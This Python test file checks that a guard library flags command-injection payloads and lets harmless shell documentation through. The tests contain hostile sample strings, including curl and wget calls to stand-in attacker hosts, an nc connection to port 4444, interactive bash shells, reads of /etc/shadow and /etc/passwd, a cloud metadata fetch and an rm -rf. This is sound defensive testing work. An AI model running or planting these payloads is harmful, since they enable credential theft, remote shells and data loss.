from adiuvare import Guard


def _check(payload: str):
    guard = Guard()
    return guard.check_sync("probe-user", payload=payload)


def _is_flagged(payload: str) -> bool:
    _, event = _check(payload)
    return event is not None and event.score > 0.0


class TestCmdSepSeparators:

    def test_and_and_separator_curl(self):
        assert _is_flagged("q=hello && curl http://evil.example/x") is True

    def test_or_or_separator_wget(self):
        assert _is_flagged("name=foo || wget http://attacker.example/s.sh") is True

    def test_semicolon_separator_bash(self):
        assert _is_flagged("id=1; bash -i") is True

    def test_semicolon_separator_sh(self):
        assert _is_flagged("file=report.pdf; sh /tmp/x") is True

    def test_pipe_separator_python(self):
        assert _is_flagged("input=data | python -c 'import os;os.system(\"id\")'") is True

    def test_pipe_separator_nc(self):
        assert _is_flagged("msg=hi | nc 10.0.0.1 4444") is True

    def test_and_and_separator_php(self):
        assert _is_flagged("search=test && php -r 'system(\"id\");'") is True

    def test_pipe_separator_perl(self):
        assert _is_flagged("q=x | perl -e 'exec(\"/bin/sh\")'") is True

    def test_pipe_separator_rm(self):
        assert _is_flagged("file=log.txt | rm -rf /tmp/work") is True


class TestCmdSubshell:

    def test_subshell_curl(self):
        assert _is_flagged("url=$(curl http://169.254.169.254/latest/meta-data/)") is True

    def test_subshell_wget(self):
        assert _is_flagged("data=$(wget -qO- http://attacker.example/token)") is True

    def test_subshell_bash(self):
        assert _is_flagged("cmd=$(bash -c 'whoami')") is True

    def test_subshell_python(self):
        assert _is_flagged("out=$(python -c 'import socket;print(socket.gethostname())')") is True

    def test_subshell_sh(self):
        assert _is_flagged("x=$(sh -i 2>&1)") is True


class TestCmdBacktick:

    def test_backtick_cat(self):
        assert _is_flagged("name=`cat /etc/shadow`") is True

    def test_backtick_curl(self):
        assert _is_flagged("token=`curl http://evil.example/steal`") is True

    def test_backtick_wget(self):
        assert _is_flagged("file=`wget -O /tmp/shell http://attacker.example/s`") is True

    def test_backtick_id(self):
        assert _is_flagged("user=`id`") is True

    def test_backtick_whoami(self):
        assert _is_flagged("user=`whoami`") is True

    def test_backtick_bash(self):
        assert _is_flagged("shell=`bash -i`") is True


class TestEtcPasswdProbes:

    def test_semicolon_cat_passwd(self):
        assert _is_flagged("; cat /etc/passwd") is True

    def test_and_and_cat_passwd(self):
        assert _is_flagged("&& cat /etc/passwd") is True

    def test_pipe_cat_passwd(self):
        assert _is_flagged("| cat /etc/passwd") is True


class TestBenignShellDocumentation:

    def test_fenced_bash_block(self):
        payload = "```bash\ncurl https://example.com/api\n```"
        gate, _ = _check(payload)
        assert gate.passed is True

    def test_plain_prose_about_curl(self):
        payload = "Use curl to fetch remote resources in your scripts."
        gate, _ = _check(payload)
        assert gate.passed is True

    def test_plain_prose_about_wget(self):
        payload = "wget is a non-interactive network downloader."
        gate, _ = _check(payload)
        assert gate.passed is True

    def test_plain_prose_about_bash(self):
        payload = "bash is the GNU Bourne Again shell."
        gate, _ = _check(payload)
        assert gate.passed is True

    def test_plain_prose_about_python(self):
        payload = "python scripts can be run with the python interpreter."
        gate, _ = _check(payload)
        assert gate.passed is True

    def test_pipe_operator_in_prose(self):
        payload = "The pipe operator | is used to chain commands in a shell tutorial."
        gate, _ = _check(payload)
        assert gate.passed is True

    def test_shell_history_description(self):
        payload = "In a shell script you might write: for f in *.log; do echo $f; done"
        gate, _ = _check(payload)
        assert gate.passed is True

    def test_double_ampersand_in_url_query(self):
        payload = "https://example.com/search?q=foo&&page=2"
        gate, _ = _check(payload)
        assert gate.passed is True

    def test_python_import_in_docstring(self):
        payload = "Example: python manage.py runserver"
        gate, _ = _check(payload)
        assert gate.passed is True
